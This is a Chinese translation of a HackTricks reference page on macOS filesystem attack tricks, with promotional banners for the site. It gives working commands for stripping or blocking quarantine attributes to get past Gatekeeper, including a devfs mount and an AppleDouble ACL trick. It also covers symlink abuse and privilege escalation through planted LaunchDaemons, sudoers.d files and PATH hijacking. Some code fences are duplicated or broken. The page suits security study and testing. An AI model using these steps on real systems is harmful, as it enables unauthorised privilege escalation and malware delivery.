# macOS FS 技巧

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## POSIX 权限组合

**目录**中的权限：

* **读取** - 您可以**列举**目录条目
* **写入** - 您可以在目录中**删除/写入** **文件**，并且可以**删除空文件夹**。&#x20;
* 但是您**无法删除/修改非空文件夹**，除非您对其具有写权限。
* 您**无法修改文件夹的名称**，除非您拥有它。
* **执行** - 您被**允许遍历**目录 - 如果您没有这个权限，您将无法访问其中的任何文件，或任何子目录中的文件。

### 危险组合

**如何覆盖由 root 拥有的文件/文件夹**，但：

* 路径中的一个父**目录所有者**是用户
* 路径中的一个父**目录所有者**是具有**写入权限**的**用户组**
* 一个用户**组**对**文件**有**写入**权限

有了以上任何一种组合，攻击者可以**注入**一个**符号/硬链接**到预期路径，以获得特权的任意写入。

### 文件夹 root R+X 特殊情况

如果一个**目录**中有文件，**只有 root 有 R+X 访问权限**，那么其他人**无法访问**这些文件。因此，如果存在一个漏洞允许**移动用户可读的文件**，但由于该**限制**而无法读取的文件，从这个文件夹**移动到另一个文件夹**，可能会被滥用来读取这些文件。

示例在：[https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## 符号链接 / 硬链接

如果一个特权进程正在向**文件**写入数据，而这个文件可以被**低权限用户控制**，或者可以被低权限用户**预先创建**。用户可以通过符号链接或硬链接**指向另一个文件**，特权进程将在该文件上写入。

在其他部分检查攻击者如何可以**滥用任意写入来提升权限**。

## .fileloc

扩展名为 **`.fileloc`** 的文件可以指向其他应用程序或二进制文件，因此当它们被打开时，将执行该应用程序/二进制文件。
示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 任意文件描述符（FD）

如果你能让一个**进程以高权限打开一个文件或文件夹**，你可以利用**`crontab`**以**`EDITOR=exploit.py`**的方式打开`/etc/sudoers.d`中的文件，这样`exploit.py`就能获取到`/etc/sudoers`中文件的文件描述符，并对其进行滥用。

例如：[https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## 绕过隔离属性（xattrs）技巧

### 移除它
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable 标志

如果一个文件/文件夹具有这个不可变属性，将无法在其上添加 xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs 挂载

**devfs** 挂载**不支持 xattr**，更多信息见 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

此 ACL 防止向文件添加 `xattrs`
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 文件格式会复制文件及其访问控制列表（ACEs）。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中可以看到，存储在名为 **`com.apple.acl.text`** 的扩展属性（xattr）中的ACL文本表示将被设置为解压缩文件的ACL。因此，如果你将一个应用程序压缩成带有防止其他xattrs写入的ACL的 **AppleDouble** 文件格式的zip文件...隔离属性（quarantine xattr）没有被设置到应用程序中：

查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)获取更多信息。

要复制这个过程，我们首先需要获取正确的acl字符串：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(请注意，即使这样做，沙盒在之前也会写入隔离 xattr)

虽然不是必须的，但我还是保留在这里，以防万一：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## 绕过代码签名

包含文件 **`_CodeSignature/CodeResources`** 的包，其中包含了包内每个**文件**的**哈希值**。注意，CodeResources 的哈希值也被**嵌入到可执行文件中**，所以我们也不能干扰它。

然而，有些文件的签名不会被检查，这些文件在 plist 中有 omit 键，例如：
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
```bash
codesign -d --verbose=4 /path/to/resource
```
{% endcode %}

这可以通过命令行界面计算资源的签名：

{% code overflow="wrap" %}
```bash
codesign -d --verbose=4 /path/to/resource
```
{% endcode %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## 挂载 dmg 文件

即使在一些现有文件夹之上，用户也可以挂载一个自定义的 dmg 文件。以下是您如何创建一个带有自定义内容的自定义 dmg 包：

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## 任意写入

### 定期 sh 脚本

如果你的脚本可以被解释为一个**shell 脚本**，你可以覆盖**`/etc/periodic/daily/999.local`** shell 脚本，该脚本将每天被触发。

你可以用以下命令**伪造**这个脚本的执行：**`sudo periodic daily`**

### 守护进程

写一个任意的**LaunchDaemon**，如**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，它执行一个任意脚本，例如：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
```markdown
只需创建脚本 `/Applications/Scripts/privesc.sh` 并写入您希望以 root 身份运行的**命令**。

### Sudoers 文件

如果您具有**任意写入**权限，您可以在 **`/etc/sudoers.d/`** 文件夹内创建一个文件，为自己授予 **sudo** 权限。

### PATH 文件

文件 **`/etc/paths`** 是填充 PATH 环境变量的主要位置之一。您必须是 root 用户才能覆盖它，但如果一个**特权进程**的脚本正在执行某些**没有完整路径的命令**，您可能可以通过修改此文件来**劫持**它。

&#x20;您也可以在 **`/etc/paths.d`** 中写入文件，将新文件夹加载到 `PATH` 环境变量中。

## 参考资料

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

其他支持 HackTricks 的方式：

* 如果您希望在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF** 版本，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。**

</details>
```
